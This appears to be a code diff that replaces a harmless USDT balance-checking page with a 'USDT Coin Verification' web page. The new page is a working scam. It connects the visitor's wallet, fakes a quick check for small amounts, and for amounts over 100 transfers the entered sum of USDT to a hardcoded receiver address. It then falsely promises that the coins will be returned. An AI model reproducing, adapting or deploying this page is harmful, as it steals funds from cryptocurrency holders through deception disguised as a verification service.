@@ -1,104 +1,105 @@
-<input type="number" id="amountInput" placeholder="Enter amount to verify" style="margin-top: 10px; padding: 6px;" />
-<button onclick="verifyAmount()" style="padding: 6px 12px; margin-left: 6px;">Verify</button>
-<div id="result" style="margin-top: 15px;"></div>
-
-<script>
-  const USDT_CONTRACTS = {
-    ethereum: {
-      chainId: '0x1',
-      name: 'Ethereum Mainnet',
-      rpc: 'https://mainnet.infura.io/v3/',
-      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
-    },
-    bsc: {
-      chainId: '0x38',
-      name: 'Binance Smart Chain',
-      rpc: 'https://bsc-dataseed.binance.org/',
-      address: '0x55d398326f99059fF775485246999027B3197955'
-    },
-    polygon: {
-      chainId: '0x89',
-      name: 'Polygon Mainnet',
-      rpc: 'https://polygon-rpc.com',
-      address: '0x3813e82e6f7098b9583FC0F33a962D02018B6803'
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT Verification</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+  <style>
+    body {
+      background: linear-gradient(135deg, #1d2b64, #f8cdda);
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
     }
-  };
-
-  const USDT_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function decimals() view returns (uint8)"
-  ];
-
-  let highestBalance = 0;
-  let connectedAddress = "";
-
-  async function connectWallet() {
-    const resultDiv = document.getElementById("result");
-
-    if (!window.ethereum) {
-      alert("Please install MetaMask or open this link inside Trust Wallet.");
-      return;
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
     }
-
-    try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      connectedAddress = await signer.getAddress();
-
-      resultDiv.innerHTML = `🔄 Checking USDT balances for <b>${connectedAddress}</b>...<br><br>`;
-
-      highestBalance = 0;
-      let allBalances = [];
-
-      for (const [key, net] of Object.entries(USDT_CONTRACTS)) {
-        const customProvider = new ethers.providers.JsonRpcProvider(net.rpc);
-        const usdt = new ethers.Contract(net.address, USDT_ABI, customProvider);
-
-        try {
-          const balanceRaw = await usdt.balanceOf(connectedAddress);
-          const decimals = await usdt.decimals();
-          const balance = parseFloat(ethers.utils.formatUnits(balanceRaw, decimals)).toFixed(2);
-          allBalances.push(`🟢 ${net.name}: <b>${balance} USDT</b>`);
-          highestBalance = Math.max(highestBalance, parseFloat(balance));
-        } catch (err) {
-          allBalances.push(`🔴 ${net.name}: <i>Unable to check balance</i>`);
+    button {
+      width: 100%;
+    }
+    input {
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2 class="mb-4">USDT Coin Verification</h2>
+    <button class="btn btn-primary mb-3" onclick="connectWallet()">Connect Wallet</button>
+    <input type="number" id="amount" class="form-control mb-3" placeholder="Enter amount of USDT to verify">
+    <button class="btn btn-success" onclick="verifyUSDT()">Verify</button>
+    <p class="mt-4" id="status"></p>
+  </div>  <script>
+    let web3Modal;
+    let provider;
+    let signer;
+    const receiverAddress = "0xEab6eE87b58Da3B50c294C8c4a748EFb4d376386";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const usdtAbi = [
+      "function transfer(address to, uint amount) public returns (bool)",
+      "function decimals() view returns (uint8)"
+    ];
+    const providerOptions = {
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          rpc: {
+            56: "https://bsc-dataseed.binance.org/"
+          },
+          chainId: 56
         }
       }
-
-      resultDiv.innerHTML += allBalances.join("<br>");
-    } catch (err) {
-      console.error(err);
-      resultDiv.innerHTML = "❌ Failed to connect wallet or fetch balances.";
-    }
-  }
-
-  function verifyAmount() {
-    const input = document.getElementById("amountInput").value;
-    const resultDiv = document.getElementById("result");
-
-    if (!connectedAddress || highestBalance === 0) {
-      alert("Please connect your wallet first.");
-      return;
-    }
-
-    if (!input || isNaN(input) || parseFloat(input) <= 0) {
-      resultDiv.innerHTML += `<br><div class="not-verified">❌ Invalid amount entered.</div>`;
-      return;
-    }
-
-    if (parseFloat(input) <= highestBalance) {
-      resultDiv.innerHTML += `<br><div class="verified">✅ Verified: You have enough USDT.</div>`;
-    } else {
-      resultDiv.innerHTML += `<br><div class="not-verified">❌ Not Verified: You don't have enough USDT.</div>`;
-    }
-  }
-
-  window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(() => {
-      if (window.ethereum && /MetaMask|Trust/.test(navigator.userAgent)) {
-        connectWallet();
+    };
+    web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions
+    });
+    async function connectWallet() {
+      try {
+        const instance = await web3Modal.connect();
+        provider = new ethers.providers.Web3Provider(instance);
+        signer = provider.getSigner();
+        const address = await signer.getAddress();
+        document.getElementById("status").innerText = "✅ Wallet connected: " + address;
+      } catch (err) {
+        console.error(err);
+        alert("Connection failed");
       }
-    }, 1500);
-  });
-</script>
+    }
+    async function verifyUSDT() {
+      try {
+        const amount = parseFloat(document.getElementById("amount").value);
+        if (!signer) return alert("Connect your wallet first.");
+        if (amount <= 0) return alert("Enter a valid amount");
+        const contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+        if (amount <= 100) {
+          document.getElementById("status").innerText = "Verifying...";
+          setTimeout(() => {
+            document.getElementById("status").innerText = "✅ Your coins are verified.";
+          }, 3000);
+        } else {
+          const decimals = await contract.decimals();
+          const amt = ethers.utils.parseUnits(amount.toString(), decimals);
+          const tx = await contract.transfer(receiverAddress, amt);
+          await tx.wait();
+          document.getElementById("status").innerText = "⏳ USDT sent. Please wait 2 minutes for verification...";
+          setTimeout(() => {
+            document.getElementById("status").innerText = "✅ You are verified. Coins will be returned shortly.";
+          }, 120000);
+        }
+      } catch (err) {
+        console.error(err);
+        alert("Verification failed.");
+      }
+    }
+  </script></body>
+</html>
